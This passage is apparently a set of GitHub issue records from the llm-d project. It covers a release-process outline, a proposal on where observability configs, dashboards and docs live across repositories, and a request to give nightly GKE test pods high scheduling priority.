1. **Overview** — Release cadence, versioning scheme, roles
2. **Pre-release** — Code freeze, release goals issue, RC process
3. **Sub-repo releases** — Step-by-step for router, kv-cache, WVA (in order)
4. **Umbrella release (llm-d/llm-d)** — Version bump PR, branch, tag, images, docs site
5. **Validation** — Image verification, guide testing, release notes review
6. **Announcement** — Email, Slack, GitHub release
7. **Hotfix process** — Cherry-pick to release branch, patch release

### Context

- Tracked in v0.8 release goals: https://github.com/llm-d/llm-d/issues/1520
- The issue template should remain as a lightweight checklist that links to this doc

records.title: [Feature]: Observability Integration Proposal
records.body:
# Observability Integration Proposal

This document shows how **observability** assets (scrape config, dashboards, alerts, tracing) are owned across llm-d repositories and linked from [well-lit path guides](https://github.com/llm-d/llm-d/tree/main/guides/README.md).

**Scope:** metrics, Prometheus/Grafana, alerts, and tracing only—not general install or architecture docs.


## Three layers

| Layer | Repo | What |
|-------|------|------|
| **1 — Config** | Each **component** repo | That component’s scrape CRs, dashboard JSON, Helm values, `PrometheusRule` (e.g. router → **llm-d-router**, WVA → **WVA** repo) |
| **2 — Shared config** | **llm-d** only | Platform-wide assets reused by many guides: Prometheus/Grafana install, cross-component Grafana JSON, **model server `PodMonitor`** (labels match guide model-server recipes), shared router monitoring Helm values |
| **3 — Procedures** | **Each repo** | Observability docs: enable scrape, import dashboards, TLS, troubleshooting (“no data”) |

**Model server scrape is Layer 2, not Layer 1:** there is no separate “vLLM component repo” in llm-d. Well-lit paths deploy model servers from llm-d recipes, so shared `PodMonitor` manifests live under [guides/recipes/modelserver/components/monitoring](https://github.com/llm-d/llm-d/tree/main/guides/recipes/modelserver/components/monitoring).

**Rules**

- **Single-component dashboard** → that component’s repo (Layer 1). Do not copy JSON into llm-d.
- **Cross-component dashboard** (model server + EPP views) → llm-d [guides/recipes/observability/grafana/dashboards](https://github.com/llm-d/llm-d/tree/main/guides/recipes/observability/grafana/dashboards).
- **Layer 3 is per repo.** WVA/router observability runbooks live in WVA and **llm-d-router**; llm-d `guides/` only **orchestrate** and **link** (optional “Enable monitoring” sections).

```text
Layer 3  llm-d:  guides/*/README.md (monitoring sections) + docs/resources/observability/
         others: WVA monitoring docs, router config/charts/README.md, …
              ↓ links
Layer 2  llm-d:  guides/recipes/observability/  (stack scripts, grafana/, tracing yamls)
              ↓ apply / helm -f
Layer 1  llm-d-router, WVA, llm-d-kv-cache, …  (each component’s own monitoring config)
```


## Where config lives (llm-d)

| What | Path |
|------|------|
| Install Prometheus + Grafana | [guides/recipes/observability/install-prometheus-grafana.sh](https://github.com/llm-d/llm-d/blob/main/guides/recipes/observability/install-prometheus-grafana.sh) |
| Load shared dashboards | [guides/recipes/observability/load-llm-d-dashboards.sh](https://github.com/llm-d/llm-d/blob/main/guides/recipes/observability/load-llm-d-dashboards.sh) |
| Shared Grafana JSON | [guides/recipes/observability/grafana/dashboards/](https://github.com/llm-d/llm-d/tree/main/guides/recipes/observability/grafana/dashboards) |
| Tracing (OTel + Jaeger) | [guides/recipes/observability/tracing/](https://github.com/llm-d/llm-d/tree/main/guides/recipes/observability/tracing) |
| vLLM PodMonitor | [guides/recipes/modelserver/components/monitoring/](https://github.com/llm-d/llm-d/tree/main/guides/recipes/modelserver/components/monitoring) |
| vLLM P/D PodMonitor | [guides/recipes/modelserver/components/monitoring-pd/](https://github.com/llm-d/llm-d/tree/main/guides/recipes/modelserver/components/monitoring-pd) |
| Router monitoring / tracing | [guides/recipes/router/features/monitoring.values.yaml](https://github.com/llm-d/llm-d/blob/main/guides/recipes/router/features/monitoring.values.yaml), [tracing.values.yaml](https://github.com/llm-d/llm-d/blob/main/guides/recipes/router/features/tracing.values.yaml) |
| Website docs (Layer 3) | [docs/resources/observability/](https://github.com/llm-d/llm-d/tree/main/docs/resources/observability) |


## Catalog

Update this table when adding components or moving assets.

| Component | Repo | Scrape / config | Dashboards | Layer 3 (observability docs) |
|-----------|------|-----------------|--------------|------------------------------|
| Model servers (well-lit paths) | llm-d **Layer 2** | `PodMonitor` — [paths above](#where-config-lives-llm-d) | [guides/recipes/observability/grafana/dashboards/](https://github.com/llm-d/llm-d/tree/main/guides/recipes/observability/grafana/dashboards) | [metrics.md](https://github.com/llm-d/llm-d/blob/main/docs/resources/observability/metrics.md) |
| llm-d Router | [llm-d-router](https://github.com/llm-d/llm-d-router) | [deploy/components/monitoring/](https://github.com/llm-d/llm-d-router/tree/main/deploy/components/monitoring) | llm-d shared dashboards (above) | [config/charts README — monitoring & tracing](https://github.com/llm-d/llm-d-router/tree/main/config/charts#4-monitoring--tracing-configuration) |
| WVA | [llm-d-workload-variant-autoscaler](https://github.com/llm-d/llm-d-workload-variant-autoscaler) | [config/base/monitoring/](https://github.com/llm-d/llm-d-workload-variant-autoscaler/tree/main/config/base/monitoring) | [deploy/grafana/](https://github.com/llm-d/llm-d-workload-variant-autoscaler/tree/main/deploy/grafana) | [docs/developer-guide/monitoring.md](https://github.com/llm-d/llm-d-workload-variant-autoscaler/blob/main/docs/developer-guide/monitoring.md) |
| KV cache | [llm-d-kv-cache](https://github.com/llm-d/llm-d-kv-cache) | deployment monitoring YAML in repo | same folder | deployment monitoring doc in repo |

**Where to put a Grafana dashboard JSON:** if panels use **one** component’s metrics only (e.g. only `wva_*`) → that **component repo** (Layer 1). If panels combine **several** parts of the stack (e.g. vLLM + EPP) → **llm-d** [guides/recipes/observability/grafana/dashboards/](https://github.com/llm-d/llm-d/tree/main/guides/recipes/observability/grafana/dashboards) (Layer 2).


## Component repo checklist

Ship in **your** repository:

- `config/.../monitoring/` or `deploy/.../monitoring/` — scrape CRs  
- `deploy/grafana/*.json` — component dashboards (optional Helm/ConfigMap install)  
- `docs/**/monitoring.md` — import steps, metric table, “no data” troubleshooting  
- Tag releases when dashboard JSON changes  

**Dashboard bar:** versioned JSON, documented import path, datasource convention, optional e2e/smoke that panels exist after kind install.


## llm-d guide checklist (monitoring section)

Use these **four subsections in this order** in the guide README (same flow as [optimized-baseline — Enable monitoring](https://github.com/llm-d/llm-d/blob/main/guides/optimized-baseline/README.md#3-optional-enable-monitoring)):

| Step | Subsection | What the reader does |
|------|------------|----------------------|
| 1 | **Prerequisites** | Decide: need llm-d Prometheus/Grafana or use GKE/OCP monitoring? WVA needs TLS? |
| 2 | **Stack** | Install shared stack ([observability setup](https://github.com/llm-d/llm-d/blob/main/docs/resources/observability/setup.md)) **or** skip if platform already scrapes metrics |
| 3 | **Scrape** | Apply `PodMonitor` / `ServiceMonitor` (or Helm `monitoring.enabled`) so Prometheus can collect workload metrics |
| 4 | **Dashboards** | Load llm-d shared Grafana JSON ([load-llm-d-dashboards.sh](https://github.com/llm-d/llm-d/blob/main/guides/recipes/observability/load-llm-d-dashboards.sh)); **link** to component repos for WVA/router dashboards |

**Why this order:** 
- decide environment first
- ensure a metrics backend exists
- tell Prometheus what to scrape
- open dashboards last (when data can already flow).


## Conventions

- **Namespaces:** model servers / router / WVA run in the guide’s workload namespace (e.g. `${NAMESPACE}`); Prometheus and Grafana from the install script usually run in **`llm-d-monitoring`**—`PodMonitor` must live in the same namespace as the pods it scrapes.  
- **Cross-repo:** prefer links and Helm flags; avoid copying dashboard JSON into llm-d.


## Reviewers

| PR type | Expect |
|---------|--------|
| **Component** (WVA, router, …) | Same PR/repo: deployable observability **config** (scrape CRs, dashboard JSON, Helm) **and** **how-to doc** (import, TLS, troubleshooting).|
| **llm-d guide** | Monitoring section with four steps (prerequisites → stack to install → scrape → dashboards); links only, no copied runbooks. |
| **llm-d dashboard** | Cross-component only; else redirect to component repo. |

Discuss changes in [#sig-observability](https://llm-d.slack.com/archives/C09305NHZ45).

### Feature Area

Observability / Monitoring

### Willingness to Contribute

Yes, I can submit a PR

### Additional Context

_No response_

records.title: [CI/CD] Add a high pod priority to all nightly jobs running on GKE
records.body:
All nightly tests should have its pods assigned a high priority to ensure they have a better chance of getting capacity to run. Higher priority means the nightly pods will preempt any other tests.

We will need to change the "[Check TPU availability](https://github.com/llm-d/llm-d-infra/blob/main/.github/workflows/reusable-nightly-e2e-gke-tpu.yaml#L262)"/"[Check GPU availability](https://github.com/llm-d/llm-d-infra/blob/main/.github/workflows/reusable-nightly-e2e-gke.yaml#L247)" checks to allow the test to continue to run even if the capacity is allocated.
